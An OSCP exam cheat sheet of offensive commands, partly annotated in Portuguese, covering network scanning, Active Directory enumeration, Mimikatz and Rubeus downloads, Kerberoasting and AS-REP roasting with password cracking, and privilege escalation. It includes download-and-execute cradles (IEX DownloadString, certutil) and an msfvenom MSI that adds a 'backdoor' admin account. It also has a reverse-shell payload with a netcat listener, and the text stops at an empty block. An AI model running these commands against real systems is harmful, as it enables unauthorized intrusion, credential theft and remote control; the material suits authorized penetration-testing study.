# OSCP
## NMAP
##### NMAP - TCP PORT QUICK SCAN
```
time nmap -T5 -sS -Pn -p- -oA scan-ports-tcp -vv 192.168.1.1
```
##### FILTER TCP PORT - LINES
```
cat scan-ports-tcp.nmap | grep -v "#" | grep "/tcp" | awk -F"/" '{ print $1}' > tcp-port-lines.txt
```
##### FILTER TCP PORT - CSV
```
cat tcp-port-lines.txt | sed -z 's/\n/,/g;s/,$/\n/'  > tcp-port.csv
```
##### NMAP - TCP PORT CUSTOM SCAN
```
time nmap -A -Pn -vv --script vuln -sV -oA scan-ports-custom 192.168.1.1 -p 22,80
```
```
time nmap -A -Pn -vv --script vuln -sV -oA scan-ports-custom 192.168.1.1 -p `cat tcp-port.csv`
```
##### NMAP - UDP PORT SCAN
```
time nmap -sU -vv -sV -oA scan-udp-1000 192.168.1.1
```
## WEBSERVER ENUMERATION
##### WEBSERVER - WHATWEB
```
time whatweb http://192.168.1.1
```
##### DIRSEARCH - SEARCH FOR DIRECTORIES
```
time dirsearch -u http://192.168.1.1/
```
## WINDOWS ENUMERATION
##### LIST - INSTALLED SOFTWARE
```
$INSTALLED = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |  Select-Object DisplayName, DisplayVersion, Publisher, InstallDate
$INSTALLED += Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate
$INSTALLED | ?{ $_.DisplayName -ne $null } | sort-object -Property DisplayName -Unique | Format-Table -AutoSize
```
```
Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
##### LIST - UNQUOTED SERVICE
```
cmd /c wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """
```
```
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """
```
##### LIST - PROCESS USING TCP PORT
```
netstat -ano -p tcp
```
```
Get-NetTCPConnection |Select-Object -Property LocalPort, State, @{name='ProcessID';expression={(Get-Process -IncludeUserName -Id $_.OwningProcess). ID}}, @{name='ProcessName';expression={(Get-Process -IncludeUserName -Id $_.OwningProcess). Path}} |Format-Table
```
##### LIST - PROCESS LISTENING TCP PORT
```
netstat -ano -p tcp| findstr /I listening
```
```
Get-NetTCPConnection -State Listen
```
##### LIST - PROCESS USING SPECIFIC TCP PORT
```
netstat -ano -p tcp| findstr /I 5040
```
```
Get-NetTCPConnection -State Listen | ?{$_.LocalPort -eq 30900}
```
```
Get-NetTCPConnection |Select-Object -Property LocalPort, State, @{name='ProcessID';expression={(Get-Process -IncludeUserName -Id $_.OwningProcess). ID}}, @{name='ProcessName';expression={(Get-Process -IncludeUserName -Id $_.OwningProcess). Path}} | ?{$_.LocalPort -eq 30900} |Format-Table
```

##### LIST - OWNER OF A PROCESS
```
tasklist /V  |findstr "PID 7580"
```
```
Get-Process -Id 4424 -IncludeUserName | Select-Object -Property ID,ProcessName,UserName
```
##### LIST - OWNER OF A PROCESS USING TCP PORT
```
Get-NetTCPConnection |Select-Object -Property LocalPort, State, @{name='ProcessID';expression={(Get-Process -IncludeUserName -Id $_.OwningProcess). ID}}, @{name='ProcessName';expression={(Get-Process -IncludeUserName -Id $_.OwningProcess). Path}}, @{name='User';expression={(Get-Process -IncludeUserName -Id $_.OwningProcess). Username}}   | Format-Table
```
##### LIST - OWNER OF A PROCESS USING SPECIFIC TCP PORT
```
Get-NetTCPConnection |Select-Object -Property LocalPort, State, @{name='ProcessID';expression={(Get-Process -IncludeUserName -Id $_.OwningProcess). ID}}, @{name='ProcessName';expression={(Get-Process -IncludeUserName -Id $_.OwningProcess). Path}}, @{name='User';expression={(Get-Process -IncludeUserName -Id $_.OwningProcess). Username}}  | ?{$_.LocalPort -eq 30900} | Format-Table
```

## ACTIVE DIRECTORY - DOMAIN ENUMERATION

##### POWERVIEW INSTALLATION
```
curl https://github.com/n0ts0cial/oscp/raw/main/Microsoft.ActiveDirectory.Management.dll -Outfile Microsoft.ActiveDirectory.Management.dll
import-module .\Microsoft.ActiveDirectory.Management.dll
```
```
curl https://github.com/n0ts0cial/oscp/raw/main/PowerView.ps1  -Outfile PowerView.ps1
import-module .\PowerView.ps1
```
```
IEX(New-Object System.Net.WebClient).DownloadString("https://github.com/n0ts0cial/oscp/raw/main/PowerView.ps1")
```
CARREGAR A DLL COMO TXT
```
curl https://github.com/n0ts0cial/oscp/raw/main/Import-ActiveDirectory.ps1  -Outfile Import-ActiveDirectory.ps1
Import-module .\Import-ActiveDirectory.ps1
Import-ActiveDirectory
```
##### POWERSPLOIT INSTALLATION
```
curl https://github.com/PowerShellMafia/PowerSploit/archive/refs/tags/v3.0.0.zip -Outfile v3.0.0.zip
curl https://github.com/n0ts0cial/oscp/raw/main/powersploit3.zip -Outfile powersploit3.zip
expand-archive -path ".\powersploit3.zip" -destinationpath ".\"
cd PowerSploit-3.0.0
Import-Module .\PowerSploit.psd1
```
## FOREST
##### LIST - FOREST
```
$MyForest = [System.DirectoryServices.ActiveDirectory.Forest]
$MyForest::GetCurrentForest()
```
##### LIST - FOREST
```
Import-Module activedirectory
$MyForestInfo = Get-ADForest
Write-Host -ForegroundColor Green "Forest Name: $($MyForestInfo.Name)"
Write-Host -ForegroundColor Green "Forest Mode: $($MyForestInfo.ForestMode)"
Write-Host -ForegroundColor Green "Forest Functional Level: $($MyForestInfo.ForestMode)"
Write-Host -ForegroundColor Green "Forest Domains: $($MyForestInfo.domains)"
```
## DOMAIN
##### LIST - DOMAIN
```
$MyDomain = [System.DirectoryServices.ActiveDirectory.Domain]
$MyDomain::GetCurrentDomain()
```
```
Get-ADForest | select domains
```
```
Get-WmiObject -Namespace root\cimv2 -Class Win32_ComputerSystem | Select Name, Domain
```
```
wmic computersystem get domain
systeminfo | findstr /B /C:"Domain"
```

##### [LIST - DOMAIN CONTROLLERS CURRENT DOMAIN](https://techexpert.tips/windows/windows-list-domain-controllers/)
```
$MyDomain = [System.DirectoryServices.ActiveDirectory.Domain]
$MyDomain::GetCurrentDomain()
```
```
Get-ADGroupMember "Domain Controllers" | %{Resolve-DnsName -Name $_.Name} | select Name, IPAddress
Get-ADDomainController -filter * | select Name, IPv4Address
Get-WmiObject -Class Win32_NTDomain | select DomainControllerName, DomainControllerAddress, DomainName, DnsForestName
Resolve-DnsName -Name _ldap._tcp.dc._msdcs.tech.local -Type ANY | select Name, IP4Address
```
```
wmic NTDOMAIN GET DomainControllerName,DomainControllerAddress,DomainName
net group "Domain Controllers" /domain
DSQUERY SERVER -o rdn
DSQUERY SERVER
nltest /dclist:TECH.LOCAL
```
##### LIST - DOMAIN CONTROLLERS OTHER DOMAIN
```
Get-ADDomainController -Discover -Domainname "tech.local"
Get-NetDomainController -Domain "tech.local"
```
##### LIST - DOMAIN CONTROLLERS MISC INFO
```
(Get-ADDomain).DistinguishedName
Get-Domainsid
(get-addomaincontroller).ldapport
(get-addomaincontroller).sslport
```
##### LIST - DOMAIN POLICY
```
Get-domainpolicy
(Get-domainpolicy)."systemaccess"
(Get-domainpolicy)."kerberospolicy"
```
##### LIST - DOMAIN POLICY OTHER DOMAIN
```
Get-domainpolicy -domain tech.local
(Get-domainpolicy -domain tech.local)."systemaccess"
(Get-domainpolicy -domain tech.local)."kerberospolicy"
```
## DOMAIN USERS
##### DOMAIN USERS - LIST ALL DOMAIN USERS
```
net user /domain
wmic USERACCOUNT where "DOMAIN = 'ABC'" get Domain,Name
wmic USERACCOUNT where "DOMAIN  like '%ABC%'" get Domain,Name
wmic USERACCOUNT Get Domain,Name,Sid
dsquery user -o samid -limit 0
dsquery user dc=ABC,dc=LOCAL -limit 0
```
```
Get-ADUser -Filter *
Get-ADUser -Filter * -Properties *
Get-ADUser -Filter * -Properties * | select Samaccountname, Enabled
```
```
get-netuser
get-netuser -Identity test3
```
##### DOMAIN USERS - LIST USERS PROPERTIES
```
Get-ADUser -identity test3 -Properties *
Get-ADUser -identity test3 -Properties * | select Samaccountname, Enabled
```
```
get-netuser -Identity test3
```
##### DOMAIN USERS - LIST USERS PROPERTIES (POWERSPLOIT)
```
curl https://github.com/PowerShellMafia/PowerSploit/archive/refs/tags/v3.0.0.zip -Outfile v3.0.0.zip
curl https://github.com/n0ts0cial/oscp/raw/main/powersploit3.zip -Outfile powersploit3.zip
expand-archive -path ".\powersploit3.zip" -destinationpath ".\"
cd PowerSploit-3.0.0
Import-Module .\PowerSploit.psd1
```
1 PROPRIEDADE DE TODOS OS USUARIOS
```
Get-UserProperty -Properties description
Get-UserProperty -Properties pwdlastset
Get-UserProperty -Properties badpwdcount
Get-UserProperty -Properties logoncount
```
```
Get-Aduser -Filter * -Properties * | select name,description
Get-Aduser -Filter * -Properties * | select name,pwdlastset
```
##### DOMAIN USERS - LIST USERS PROPERTIES EM TODOS OS USUARIOS (POWERSPLOIT)
```
Find-UserField -SearchField Description -SearchTerm "built"
Find-UserField -SearchField Description -SearchTerm "pass"
```
```
Get-AdUser -Filter 'Description -like "*built*"' -Properties Description | select name, Description
Get-AdUser -Filter 'Description -like "*pass*"' -Properties Description | select name, Description
```
##### DOMAIN USERS - LIST GROUP MEMBERSHIP
```
dsquery user -samid test3  | dsget user -memberof | dsget group -samid
```
```
Get-ADPrincipalGroupMembership vegeta | select name
Get-ADPrincipalGroupMembership vegeta 
```
```
Get-Netgroup -username vegeta
Get-Netgroup -username vegeta | select name
```
## DOMAIN GROUPS
##### DOMAIN GROUPS - LIST ALL GROUPS
```
Get-ADGroup -Filter * 
Get-ADGroup -filter * -properties * | select SAMAccountName
Get-ADGroup -filter * -properties * | select SamAccountName, ObjectClass, GroupCategory, GroupScope, DistinguishedName | Format-Table
Get-ADGroup -Filter * | select SamAccountName, objectClass, GroupCategory, GroupScope | ft -AutoSize | Out-String -Width 4096
```
```
powershell -command "Get-ADGroup -Filter * | select SamAccountName, objectClass, GroupCategory, GroupScope | ft " 
```
```
net group /domain
dsquery group
```
```
Get-Netgroup | select samaccountname
Get-Netgroup -domain tech.local
Get-Netgroup *admin*
Get-Netgroup *admin* | select samaccountname
```
##### DOMAIN GROUPS - LIST ALL GROUPS FILTER
```
Get-ADGroup -filter 'Name -like "*admin*"' | select name
Get-Netgroup *admin*
Get-Netgroup *admin* | select samaccountname
```
##### DOMAIN GROUPS - LIST ALL MEMBERS OF ALL GROUPS
```
$DomainGroups = Get-ADGroup -Filter *
foreach ($Group in $DomainGroups)
{
    Write-Host "Group: $($Group.Name)"
    $GroupMembers = Get-ADGroupMember -Identity $Group -Recursive
    foreach ($GroupMember in $GroupMembers)
    {
        Write-Host "    Member Name: $($GroupMember.sAMAccountName)"
    }
}
```
##### DOMAIN GROUPS - LIST ALL MEMBERS OF ALL GROUPS (COLORIDO)
```
$DomainGroups = Get-ADGroup -Filter *
foreach ($Group in $DomainGroups)
{
    Write-Host "Group: $($Group.Name)"  -background yellow -foreground black
    $GroupMembers = Get-ADGroupMember -Identity $Group -Recursive
    foreach ($GroupMember in $GroupMembers)
    {
        Write-Host "    Member Name: $($GroupMember.sAMAccountName)"
    }
}
```
##### DOMAIN GROUPS - LIST ALL MEMBERS OF A GROUP
```
Get-ADGroupMember -Identity "Domain Admins" | select SAMAccountName, objectClass
Get-ADGroupMember -Identity "Domain Admins" -Recursive | select SAMAccountName, objectClass
```
```
Get-NetgroupMember -identity 'GROUP-A'
Get-NetgroupMember -identity 'GROUP-A' | select SAMAccountName
Get-NetgroupMember -identity 'GROUP-A' | select groupname,MemberName,MemberObjectClass
Get-NetgroupMember -identity 'GROUP-A' -domain 'tech.local'
```
## DOMAIN COMPUTERS
##### DOMAIN COMPUTERS - LIST ALL COMPUTERS
```
Get-ADComputer -Filter *
Get-ADComputer -Filter * -Properties *
Get-ADComputer -Filter * -Properties * | select Samaccountname, Enabled
```
```
Get-Netcomputer
Get-Netcomputer | select name, samaccountname
Get-Netcomputer -operatingSystem "*Server 2022*"
Get-Netcomputer -operatingSystem "*Server 2022*" | select samaccountname
```
##### DOMAIN COMPUTERS - LIST COMPUTERS FILTERS
```
Get-ADComputer -Filter 'OperatingSystem -like "*Server 2022*"' | select name, samaccountname
Get-ADComputer -Filter 'OperatingSystem -like "*Server 2022*"' -Properties OperatingSystem | select name, samaccountname, OperatingSystem
Get-ADComputer -Filter * -Properties DNSHostname | %{ Test-Connection -Count 1 -Computername $_.DNSHostname}
```
##### DOMAIN COMPUTERS - LIST COMPUTER PROPERTIES
```
Get-ADComputer -identity tech-dc01 -Properties *
Get-ADComputer -identity tech-dc01 -Properties * | select Samaccountname, Enabled
```
```
Get-Netcomputer | select name, samaccountname
```
##### DOMAIN COMPUTERS - LIST GROUP MEMBERSHIP
```
Get-ADPrincipalGroupMembership TECH-DC01$ | select name
Get-ADPrincipalGroupMembership TECH-DC01$
```
```
dsquery * "CN=MyServiceComputer,CN=Computers,DC=TECH,DC=LOCAL" -attr MemberOf
```
```
Get-AdPrincipalGroupMembership -Identity vegeta
Get-AdPrincipalGroupMembership -Identity vegeta | select samaccountname
```
##### DOMAIN COMPUTERS - LOGGED USERS
```
quser
query user
query user /server:tech-dc01
```
```
get-netloggedon
get-netloggedon | select username,logondomain,authdomains,logonserver,computername | ft
get-netloggedon -computer server01
get-netloggedon -computer server01 | select username,logondomain,authdomains,logonserver,computername | ft
```

## [GPO - GROUP POLICY OBJECTS](https://techexpert.tips/powershell/powershell-list-all-gpo/)
##### GPO - LIST ALL GPOS
```
Get-GPO -all | select DisplayName
Get-GPO -all | select DisplayName,Id
```
```
$LDAPSEARCH = New-Object System.DirectoryServices.DirectorySearcher 
$LDAPSEARCH.SearchRoot = "LDAP://DC=TECH,DC=LOCAL"
$LDAPSEARCH.Filter = "(objectCategory=groupPolicyContainer)"
$LDAPSEARCH.FindAll()
```
##### GPO - TRANSLATE NAME / ID / NAME
```
Get-GPO -Name "Default Domain Policy" | select Displayname,Id
Get-GPO -Guid d1e5ff89-e3b2-494e-bf5c-c83f46de5b4a | select Displayname,Id
```
##### GPO - LIST ALL GPO LINKS
```
$MyGpos = Get-GPO -All
$MyLinks = foreach ($GPO in $MyGpos) {
[xml]$XMLGPO = Get-GPOReport -ReportType Xml -Guid $GPO.Id
foreach ($line in $XMLGPO.GPO.Linksto) {
		'' | Select-object @{n='Name';e={$XMLGPO.GPO.Name}},@{n='Link';e={$line.SOMPath}},@{n='Status';e={$line.Enabled}}
}
}
$MyLinks | Sort-Object Name
```
##### GPO - LIST SPECIFIC GPO LINKS
```
$MyGpos = Get-GPO -Name "MY-GPO"
$MyLinks = foreach ($GPO in $MyGpos) {
[xml]$XMLGPO = Get-GPOReport -ReportType Xml -Guid $GPO.Id
foreach ($line in $XMLGPO.GPO.Linksto) {
		'' | Select-object @{n='Name';e={$XMLGPO.GPO.Name}},@{n='Link';e={$line.SOMPath}},@{n='Status';e={$line.Enabled}}
}
}
$MyLinks | Sort-Object Name
```
##### GPO - LIST ALL GPO PERMISSIONS
```
$MyGpos = Get-GPO -All
$MyPermissions = foreach ($GPO in $MyGpos) {
Get-GPPermissions -Guid $GPO.Id -All | Select-Object @{n='Name';e={$GPO.DisplayName}},@{n='AccountName';e={$_.Trustee.Name}},@{n='AccountType';e={$_.Trustee.SidType.ToString()}},@{n='Permissions';e={$_.Permission}}
}
$MyPermissions | Sort-Object Name
```
##### GPO - LIST SPECIFIC GPO PERMISSIONS
```
$MyGpos = Get-GPO -Name "MY-GPO"
$MyPermissions = foreach ($GPO in $MyGpos) {
Get-GPPermissions -Guid $GPO.Id -All | Select-Object @{n='Name';e={$GPO.DisplayName}},@{n='AccountName';e={$_.Trustee.Name}},@{n='AccountType';e={$_.Trustee.SidType.ToString()}},@{n='Permissions';e={$_.Permission}}
}
$MyPermissions | Sort-Object Name
```
## LOCAL MACHINE - ENUMERATION
##### LOCAL MACHINE - LIST ALL USERS
```
Get-LocalUser
```
##### LOCAL MACHINE - LIST LOCAL ADMINISTRATORS
```
Get-LocalGroupMember -Group "Administrators"
```
##### LOCAL MACHINE - LIST LOCAL ADMINISTRATORS FROM ACTIVE DIRECTORY
```
$RESULT = 
$ADGROUPS = Get-LocalGroupMember -Group "Administrators" | ?{ (($_.PrincipalSource -eq "ActiveDirectory") -and ($_.ObjectClass -eq "Group")) } 
foreach ($LINE in $ADGROUPS) {
$GROUPNAME = $LINE.NAME
$LINESPLIT = $GROUPNAME.Split("\")
$MYGROUP = $LINESPLIT[1]
$RESULT += Get-ADGroupMember -Identity $MYGROUP | select objectClass, SamAccountName | ft
}
$RESULT
```
##### LOCAL MACHINE - LIST LOCAL ADMINISTRATORS FROM ACTIVE DIRECTORY RECURSIVE
```
$RESULT = 
$ADGROUPS = Get-LocalGroupMember -Group "Administrators" | ?{ (($_.PrincipalSource -eq "ActiveDirectory") -and ($_.ObjectClass -eq "Group")) } 
foreach ($LINE in $ADGROUPS) {
$GROUPNAME = $LINE.NAME
$LINESPLIT = $GROUPNAME.Split("\")
$MYGROUP = $LINESPLIT[1]
$RESULT += Get-ADGroupMember -Identity $MYGROUP -Recursive | select objectClass, SamAccountName | ft
}
$RESULT
```
##### LOCAL MACHINE - LIST ALL GROUPS
```
Get-LocalGroup
Get-LocalGroup | ft -AutoSize | Out-String -Width 4096
```
```
Get-Netlocalgroup
Get-Netlocalgroup -computer server01
```
##### LOCAL MACHINE - LIST ALL MEMBERS OF ALL GROUPS
```
$DomainGroups = Get-LocalGroup
foreach ($Group in $DomainGroups)
{
    Write-Host "Group: $($Group.Name)" -background yellow -foreground black
    $GroupMembers = Get-LocalGroupMember -Group $Group
    foreach ($GroupMember in $GroupMembers)
    {
        Write-Host "    Member Name: $($GroupMember.Name)"
    }
}
```









##### POWERVIEW - IMPORT
```
Import-module .\Microsoft.ActiveDirectory.Management.dll
Import-module .\activedirectory.psd1
```
##### LIST - GPOS(POWERVIEW)
```
get-netgpo
get-netgpo -computer server01
```
##### BLOODHOUND - PYTHON
```
git clone https://github.com/fox-it/BloodHound.py
cd BloodHound.py
python setup.py install
```
```
bloodhound-python -u username -p password -dc xx.aa.com --disable-auto-gc -d aa.com         --CHECAR OPÇÔES DEFAULT , INTERESSANTE LIMITAR AOS DOMAIN CONTROLELRS
bloodhound-python -u username -p password -dc xx.aa.com --disable-auto-gc -d aa.com -c all   --TODOS O S METODOS DE COLLECTION
```
##### BLOODHOUND - POWERSHELL
```
IEX (New-Object System.Net.WebClient).DownloadString("http://175.12.80.10:8080/SharpHound.ps1")
Invoke-BloodHound 
```
```
INvoke-Bloodhound -Collectionmethod All
Invoke-BloodHound -CollectionMethod ACL,ObjectProps
-CompressData -RemoveCSV and -NoSaveCache   --GERAR O ARQUIVO ZIP PARA ARRASRTAR NO BLOODHOUND
```
##### BLOODHOUND - SHARPHOUND
```
SharpHound.exe
```
# MIMIKATZ
## TECHNIQUES
##### MIMIKATZ - DOWNLOAD E EXECUTE ZIP VIA POWERSHELL
```
curl https://github.com/n0ts0cial/oscp/raw/main/mimikatz_trunk.zip -Outfile mimikatz_trunk.zip
expand-archive -path ".\mimikatz_trunk.zip" -destinationpath ".\"
cd x64
.\mimikatz.exe
```
##### MIMIKATZ - DOWNLOAD E EXECUTE EXE VIA POWERSHELL
```
curl https://github.com/n0ts0cial/oscp/raw/main/x64/mimikatz.exe -Outfile mimikatz.exe
.\mimikatz.exe
```
# RUBEUS
## TECHNIQUES
##### RUBEUS - DOWNLOAD E EXECUTE EXE VIA POWERSHELL
```
curl https://github.com/n0ts0cial/oscp/raw/main/rubeus/Rubeus.exe -Outfile rubeus.exe
.\rubeus.exe
```
# SEATBELT (https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/seatbelt)
## TECHNIQUES
##### SEATBELT - DOWNLOAD E EXECUTE ZIP VIA POWERSHELL
```
curl https://github.com/n0ts0cial/oscp/raw/main/Seatbelt.exe -Outfile Seatbelt.exe
Seatbelt.exe -group=all
.\Seatbelt.exe -group=all
```
# PRIVILEGE ESCALATION WINDOWS
## TECHNIQUES
##### ALWAYS ELEVATED(1)
```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

Get-ItemProperty HKLM\Software\Policies\Microsoft\Windows\Installer
Get-ItemProperty HKCU\Software\Policies\Microsoft\Windows\Installer
```
```
msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi -o evil.msi
msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi-nouac -o evil.msi
msiexec /quiet /qn /i C:\evil.msi
```
# ATTACK - ACTIVE DIRECTORY
## KERBEROASTING
##### KERBEROASTING - LOAD REQUIREMENTS
```
curl https://github.com/n0ts0cial/oscp/raw/main/Microsoft.ActiveDirectory.Management.dll -Outfile Microsoft.ActiveDirectory.Management.dll
import-module .\Microsoft.ActiveDirectory.Management.dll
```
```
curl https://github.com/n0ts0cial/oscp/raw/main/PowerView.ps1  -Outfile PowerView.ps1
import-module .\PowerView.ps1
```
##### KERBEROASTING - FIND SPN
PROCURE POR CONTAS COM PERMISSÕES ADMINISTRATIVAS, EM GRUPOS COM PERMISSÕES ADMINISTRATIVAS
```
Get-ADUSer -Filter { ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName | select SamAccountName, ServicePrincipalName
$FormatEnumerationLimit=-1
Get-ADComputer -Filter { ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName | select SamAccountName, ServicePrincipalName | Out-String -Width 4096
```
```
Get-NetUser -SPN | select samaccountname,serviceprincipalname
Get-NetUser -SPN | ?{$_.memberof -match 'Domain Admins'}
```
##### KERBEROASTING - LIST ALL SPN
```
$MySearch = New-Object DirectoryServices.DirectorySearcher([ADSI]"")
$MySearch.filter = "(servicePrincipalName=*)"
$MyResults = $MySearch.Findall()

foreach($result in $MyResults)
{
 $userEntry = $result.GetDirectoryEntry()
 Write-host "Object Name = " $userEntry.name -backgroundcolor "yellow" -foregroundcolor "black"
 Write-host "DN = "  $userEntry.distinguishedName
 Write-host "Object Cat. = "  $userEntry.objectCategory
 Write-host "servicePrincipalNames"
 $i=1
 foreach($SPN in $userEntry.servicePrincipalName)
  {
  Write-host "SPN(" $i ")   = "   $SPN
  $i+=1
  }
  Write-host ""
  }
```
##### KERBEROASTING - LIST ALL SPN USERS
```
$MySearch = New-Object DirectoryServices.DirectorySearcher([ADSI]"")
$MySearch.filter = "(&(objectClass=user)(objectCategory=user)(servicePrincipalName=*))"
$MyResults = $MySearch.Findall()

foreach($result in $MyResults)
{
 $userEntry = $result.GetDirectoryEntry()
 Write-host "Object Name = " $userEntry.name -backgroundcolor "yellow" -foregroundcolor "black"
 Write-host "DN = "  $userEntry.distinguishedName
 Write-host "Object Cat. = "  $userEntry.objectCategory
 Write-host "servicePrincipalNames"
 $i=1
 foreach($SPN in $userEntry.servicePrincipalName)
  {
  Write-host "SPN(" $i ")   = "   $SPN
  $i+=1
  }
  Write-host ""
  }
```
##### KERBEROASTING - REQUEST A TGS TICKET
```
Add-Type -Assemblyname System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -Argumentlist "HTTP/MyServiceComputer.TECH.LOCAL"
```
```
Request-SPNTicket -SPN "HTTP/MyServiceComputer.TECH.LOCAL" -Format Hashcat
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation
```
```
Rubeus.exe kerberoast /stats
Rubeus.exe kerberoast /user:analystm2 /nowrap
Rubeus.exe kerberoast /user:analystm2 /nowrap /simple
Rubeus.exe kerberoast /user:analystm2 /nowrap /simple /outfile:C:\hashestgt.txt
```
```
.\mimikatz.exe
kerberos::list /export
Invoke-Mimikatz -Command '"kerberos::list /export"'
```
##### KERBEROASTING - CRACK PASSWORD
```
hashcat -m 13100 -a 0 hashestgt.txt wordlist.txt
hashcat -m 13100 -a 0 hashestgt.txt wordlist.txt -o quebradas.txt
hashcat -m 13100 -a 0 hashestgt.txt wordlist.txt --show
```
```
john hashestgt.txt --wordlist=wordlist.txt
john --format=krb5tgs hashestgt.txt --wordlist=wordlist.txt
john --show hashestgt.txt
rm  /root/.john/john.pot
```
##### KERBEROS - CONVERTER TICKET KIRBI PARA BASE64
```
kirbi2john ticket.kirbi > ticket.john
john -format=krb5tgs ticket.john --wordlist=wordlist.txt
john -format=krb5tgs ticket.john --show
hashcat -m 13100 -a 0 ticket.john wordlist.txt
hashcat -m 13100 -a 0 ticket.john wordlist.txt --show
hashcat -m 13100 -a 0 ticket.john wordlist.txt --potfile-disable
```
## KERBEROASTING-ASREP
##### KERBEROASTINGASREP - LOAD REQUIREMENTS
```
curl https://github.com/n0ts0cial/oscp/raw/main/Microsoft.ActiveDirectory.Management.dll -Outfile Microsoft.ActiveDirectory.Management.dll
import-module .\Microsoft.ActiveDirectory.Management.dll
```
```
curl https://github.com/n0ts0cial/oscp/raw/main/PowerView.ps1  -Outfile PowerView.ps1
import-module .\PowerView.ps1
```
##### KERBEROASTING-ASREP - FIND USERS
PROCURE POR CONTAS COM PERMISSÕES ADMINISTRATIVAS, EM GRUPOS COM PERMISSÕES ADMINISTRATIVAS
```
Get-ADUSer -Filter { DoesNotRequirePreAuth -eq $true } -Properties DoesNotRequirePreAuth
Get-ADUSer -Filter { DoesNotRequirePreAuth -eq $true } -Properties DoesNotRequirePreAuth | select SamAccountName, ServicePrincipalName
```
```
Get-DomainUser -PreauthNotRequired -Verbose
Get-DomainUser -PreauthNotRequired 
Get-DomainUser -PreauthNotRequired | select samaccountname
Get-DomainUser -PreauthNotRequired | ?{$_.memberof -match 'Domain Admins'}
Get-DomainUser -PreauthNotRequired | ?{$_.memberof -match 'Domain Admins'} | select samaccountname
```
##### KERBEROASTING-ASREP - FIND ALL USERS
```
$MySearch = New-Object DirectoryServices.DirectorySearcher([ADSI]"")
$MySearch.filter = "(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))"
$MyResults = $MySearch.Findall()
foreach($result in $MyResults)
{
 $userEntry = $result.GetDirectoryEntry()
 Write-host "Object Name = " $userEntry.name -backgroundcolor "yellow" -foregroundcolor "black"
 Write-host "DN = "  $userEntry.distinguishedName
 Write-host "Object Cat. = "  $userEntry.objectCategory
 Write-host "SamAccountName = "  $userEntry.SamAccountName
 Write-host "servicePrincipalNames"
 $i=1
 foreach($SPN in $userEntry.servicePrincipalName)
  {
  Write-host "SPN(" $i ")   = "   $SPN
  $i+=1
  }
  Write-host ""
  }
```
##### KERBEROASTING-ASREP - PESQUISAR PERMISSOES SUSPEITAS
```
$FormatEnumerationLimit=-1
Invoke-ACLScanner -ResolveGUIDs | select ObjectDN,IdentityReferenceName,ActiveDirectoryRights | Out-String -Width 4096
```
```
$FormatEnumerationLimit=-1
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "bruno"} | select ObjectDN,IdentityReferenceName,ActiveDirectoryRights | Out-String -Width 4096
```
```
$FormatEnumerationLimit=-1
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "Domain Admins"} | select ObjectDN,IdentityReferenceName,ActiveDirectoryRights | Out-String -Width 4096
```
SE ACHAR, PODE DESABILITAR O KERBEROS PREAUTH MANUALMENTE
```
Set-DomainObject -Identity test4 -XOR @{useraccountcontrol=4194304} -Verbose
Set-ADAccountControl -Id kamisama -DoesNotRequirePreAuth:$true
```
##### KERBEROASTING-ASREP - OBTER O HASH DE USUARIOS USANDO SOMENTE POWERSHELL
```
curl https://github.com/n0ts0cial/oscp/raw/main/ASREPRoast.ps1 -Outfile ASREPRoast.ps1
import-module .\ASREPRoast.ps1
Get-ASREPHash -Username test3 -Verbose
```
```
$FormatEnumerationLimit=-1
Invoke-ASREPRoast -Verbose | Out-String -Width 4096
```
##### KERBEROASTING-ASREP - OBTER O HASH DE USUARIOS USANDO RUBEUS
```
Rubeus.exe asreproast /nowrap
Rubeus.exe asreproast /user:test3 /nowrap
Rubeus.exe asreproast /user:test3 /nowrap /simple
Rubeus.exe asreproast /user:test3 /nowrap /simple /outfile:hash.txt
Rubeus.exe asreproast /user:test3 /format:hashcat /nowrap
```
##### KERBEROASTING-ASREP - CRACK PASSWORD
```
john hashes.txt --wordlist=wordlist.txt
john --format=krb5asrep hashes.txt --wordlist=wordlist.txt
john --show hashes.txt
rm  /root/.john/john.pot
```
HASHCAT - TIPO23 (17 ou 19)
```
hashcat -m 18200 -a 0 hashes.txt wordlist.txt
hashcat -m 18200 -a 0 hashes.txt wordlist.txt -o quebradas.txt
hashcat -m 18200 -a 0 hashes.txt wordlist.txt --show
hashcat -m 18200 -a 0 hashes.txt wordlist.txt --potfile-disable
```
# POWERSHELL
## DOWNLOAD
##### POWERSHELL - DOWNLOAD AS STRING
```
IEX (New-Object System.Net.WebClient).DownloadString("http://175.12.80.10:8080/SharpHound.ps1")
```
##### POWERSHELL - DOWNLOAD CURL
```
curl https://github.com/samratashok/nishang/raw/master/Gather/Invoke-Mimikatz.ps1 -Outfile Invoke-Mimikatz.ps1
```
##### POWERSHELL - DOWNLOAD CERTUTIL
```
certutil -urlcache -split -f http://10.11.7.210/chisel_1.7.7_windows_amd64
```

## MSFVENOM
##### REVERSE SHELL - LINUX x64
```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=666 -f elf -o shell666.elf
```
```
nc -nvlp 666
```
```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
##### REVERSE SHELL - WINDOWS x64
```
